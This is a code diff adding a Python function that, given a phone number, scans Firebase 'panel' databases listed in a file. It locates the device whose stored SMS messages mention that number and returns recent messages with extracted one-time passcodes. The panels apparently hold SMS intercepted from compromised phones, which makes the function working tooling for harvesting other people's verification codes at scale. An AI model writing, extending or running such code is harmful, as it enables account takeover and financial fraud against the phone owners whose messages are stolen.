@@ -543,3 +543,124 @@ def process_numbers_parallel(jobs, batch_code, max_workers=5, progress_callback=
                 print(f"[WARN] Worker error: {e}")
 
     return total_success, results
+
+
+# ----------------------------------------------------------------------
+# Fast Telegram / Standalone OTP Fetcher Helper
+def fetch_otp_for_phone(phone_input):
+    clean_phone = "".join(filter(str.isdigit, str(phone_input)))
+    if len(clean_phone) > 10 and clean_phone.startswith("91"):
+        clean_phone = clean_phone[2:]
+
+    if len(clean_phone) != 10:
+        return {"status": "error", "message": "Invalid 10-digit phone number", "phone": clean_phone}
+
+    device_index_file = "device_index.json"
+    device_index = {}
+    if os.path.exists(device_index_file):
+        try:
+            with open(device_index_file, "r", encoding="utf-8") as jf:
+                device_index = json.load(jf)
+        except Exception:
+            device_index = {}
+
+    info = device_index.get(clean_phone)
+    panel_url = info.get("panel_url") if isinstance(info, dict) else None
+    client_id = info.get("client_id") if isinstance(info, dict) else None
+
+    # If unmapped, perform quick scan across panels.txt
+    if not panel_url or not client_id:
+        panel_urls = []
+        if os.path.exists("panels.txt"):
+            with open("panels.txt", "r", encoding="utf-8") as f:
+                for line in f:
+                    p = parse_firebase_link(line)
+                    if p:
+                        panel_urls.append(p)
+
+        headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
+
+        def scan_panel(p_url):
+            try:
+                resp = requests.get(f"{p_url.rstrip('/')}/messages.json", headers=headers, timeout=6)
+                if resp.status_code == 200:
+                    data = resp.json() or {}
+                    if isinstance(data, dict):
+                        for cid, device_msgs in data.items():
+                            if isinstance(device_msgs, dict):
+                                for m in device_msgs.values():
+                                    if isinstance(m, dict):
+                                        t = str(m.get("body") or m.get("message") or m.get("text") or "")
+                                        if clean_phone in t:
+                                            return p_url, cid
+            except Exception:
+                pass
+            return None, None
+
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            futures = [executor.submit(scan_panel, u) for u in panel_urls]
+            for f in as_completed(futures):
+                p_u, c_i = f.result()
+                if p_u and c_i:
+                    panel_url = p_u
+                    client_id = c_i
+                    # Save mapping for future 50ms direct lookup
+                    device_index[clean_phone] = {"panel_url": panel_url, "client_id": client_id}
+                    try:
+                        with open(device_index_file, "w", encoding="utf-8") as jf:
+                            json.dump(device_index, jf, indent=2)
+                    except Exception:
+                        pass
+                    break
+
+    if not panel_url or not client_id:
+        return {"status": "not_found", "message": f"Phone {clean_phone} not found on any panel", "phone": clean_phone}
+
+    # Fetch messages from direct endpoint
+    try:
+        url = f"{panel_url.rstrip('/')}/messages/{client_id}.json"
+        headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
+        resp = requests.get(url, headers=headers, timeout=6)
+        if resp.status_code == 200:
+            data = resp.json() or {}
+            messages = []
+            if isinstance(data, dict):
+                for mid, mdata in data.items():
+                    if isinstance(mdata, dict):
+                        body = str(mdata.get("body") or mdata.get("message") or mdata.get("text") or "")
+                        if not body:
+                            continue
+                        sender = str(mdata.get("sender") or mdata.get("address") or mdata.get("from") or "Unknown")
+                        ts_val = 0
+                        ts_str = "Unknown"
+                        try:
+                            ts_val = int(mid) / 1000
+                            ts_str = datetime.fromtimestamp(ts_val).strftime("%Y-%m-%d %H:%M:%S")
+                        except Exception:
+                            pass
+
+                        otp_match = re.search(r"(?<!\d)(\d{4}|\d{6})(?!\d)", body)
+                        otp = otp_match.group(1) if otp_match else "N/A"
+
+                        messages.append({
+                            "msg_id": mid,
+                            "sender": sender,
+                            "body": body,
+                            "otp": otp,
+                            "time": ts_str,
+                            "ts_val": ts_val
+                        })
+
+            messages.sort(key=lambda x: (x["ts_val"], str(x["msg_id"])), reverse=True)
+            return {
+                "status": "success",
+                "phone": clean_phone,
+                "panel_url": panel_url,
+                "client_id": client_id,
+                "messages": messages[:3]
+            }
+    except Exception as e:
+        return {"status": "error", "message": str(e), "phone": clean_phone}
+
+    return {"status": "error", "message": "Failed to fetch messages", "phone": clean_phone}
+
